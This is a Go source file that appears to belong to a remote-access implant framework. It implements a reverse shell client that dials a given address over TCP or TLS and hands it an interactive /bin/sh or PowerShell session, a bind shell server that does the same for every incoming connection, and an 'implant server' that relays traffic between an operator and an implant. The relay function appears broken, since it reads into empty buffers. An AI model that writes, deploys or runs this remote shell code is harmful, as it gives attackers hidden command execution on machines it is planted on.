package core

import (
  "io"
  "net"
  "log"
  "time"
  "bytes"
  "os/exec"
  "runtime"
  "crypto/tls"
  "crypto/x509"
  "odin/lib/penguins/zoo"
)
// Normal TCP Server
//Runs an interactive shell for admin server
type IServer struct{
  Address,Protocol string
  RootPem []byte
  CertPem []byte
}

func (s *IServer) Server(){
  lis,err := net.Listen(s.Protocol,s.Address)
  if err != nil{
    log.Fatal(err)
  }
  for {
    conn,err := lis.Accept()
    if err !=  nil{
      log.Fatal(err)
    }
    go Handle(conn)
  }
}

type WhegleClient struct{
  Address,Protocol string
  RootPem []byte
}
// runs a client interactive shell
func (wc *WhegleClient) Client(){
  var conn net.Conn
  var err error
  if wc.Protocol == "tls"{
    roots := x509.NewCertPool()
    ok := roots.AppendCertsFromPEM(wc.RootPem)
    if !ok {
      log.Println("Error appending cert to pool")
      return
    }
    conn,err = tls.Dial("tcp",wc.Address, &tls.Config{
      RootCAs: roots,
    })
    if err != nil{
      log.Println(err);return
    }
  } else {
    conn,err = net.Dial(wc.Protocol,wc.Address)
    if err != nil{
      log.Println(err);return
    }
  }
  rp, wp := io.Pipe()
  var cmd *exec.Cmd
  if runtime.GOOS == "windows"{
    cmd = exec.Command("powershell.exe")
  } else {
    cmd = exec.Command("/bin/sh","-i")
  }
  zoo.CommandExecuter(cmd)
  cmd.Stdin = conn
  cmd.Stdout = wp
  go io.Copy(conn,rp)
  cmd.Run()
  conn.Close()
}

func Handle(conn net.Conn){
  var cmd *exec.Cmd
  rp, wp := io.Pipe()
  if runtime.GOOS == "windows"{
    cmd = exec.Command("powershell.exe")
  } else {
    cmd = exec.Command("/bin/sh","-i")
  }
  zoo.CommandExecuter(cmd)
  cmd.Stdin = conn
  cmd.Stdout = wp
  go io.Copy(conn,rp)
  cmd.Run()
  conn.Close()
}

type InteractiveServer struct{
  Address,Protocol,AProtocol,OAddress string
  RootPem []byte
  CertPem []byte
}

func (s *InteractiveServer) StartInteractiveImplantServer(){
  lis,err := net.Listen(s.Protocol,s.Address)
  if err != nil{
    log.Fatal(err)
  }
  aLis,err := net.Listen(s.AProtocol,s.OAddress)
  if err != nil{
    log.Fatal(err)
  }
  for {
    conn,err := lis.Accept()
    if err !=  nil{
      log.Fatal(err); return
    }
    aConn,aErr := aLis.Accept()
    if aErr != nil{
      log.Println(aErr);return
    }
    go ServerHandler(aConn,conn)
  }
}

// swap the conections
func ServerHandler(adminConn,implantConn net.Conn){
  var adminIn bytes.Buffer
  var adminOut bytes.Buffer
  //var clientIn bytes.Buffer
  //var clientOut bytes.Buffer{}
  //read from implant
  if _,err := implantConn.Read(adminOut.Bytes()); err != nil {
    log.Println(err);return
  }
  //write to admin
  if _,err := adminConn.Write(adminOut.Bytes()); err != nil {
    log.Println(err);return
  }
  //wait for admin
  time.Sleep(3 *time.Second)
  //read from admin
  if _,err := adminConn.Read(adminIn.Bytes()); err != nil {
    log.Println(err);return
  }
  //write to client
  if _,err := implantConn.Write(adminIn.Bytes());err != nil {
    log.Println(err)
  }
}
